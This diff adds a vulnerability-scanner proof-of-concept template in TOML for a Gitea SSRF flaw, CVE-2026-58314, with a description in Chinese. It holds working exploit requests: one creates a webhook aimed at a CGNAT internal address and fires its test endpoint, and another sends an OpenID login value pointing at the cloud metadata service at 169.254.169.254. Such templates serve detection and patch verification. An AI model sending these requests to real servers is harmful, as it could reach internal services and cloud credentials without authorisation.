@@ -1,0 +1,81 @@
+[info]
+author = "AVE"
+description = "检测 Gitea 两处 SSRF 漏洞：1) hostmatcher 遗漏 CGNAT(100.64.0.0/10) 导致 Webhook 可向内部地址发请求；2) OpenID 登录端点无 IP 过滤可被任意互联网用户驱动向内部 IP 发 GET 请求"
+id = "POC-AVE-2026-0653"
+name = "CVE-2026-58314 PoC"
+severity = "high"
+tags = [
+    "cve-2026-58314",
+    "gitea",
+    "ssrf",
+    "hostmatcher-bypass",
+    "openid-ssrf",
+]
+vuln_id = [
+    "CVE-2026-58314",
+    "GHSA-2fcr-jfvc-vgg2",
+    "AVE-2026-0653",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/user/hooks"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"type":"gitea","config":{"url":"http://100.64.0.1:8080/internal","content_type":"json"},"events":["push"],"active":true}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "created",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/user/hooks/1/tests"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "204",
+    "No Content",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/user/login/openid"
+protocol = "http"
+
+[poc.requests.body]
+content = "openid=http://169.254.169.254/latest/meta-data/"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Internal Server Error",
+    "500",
+]
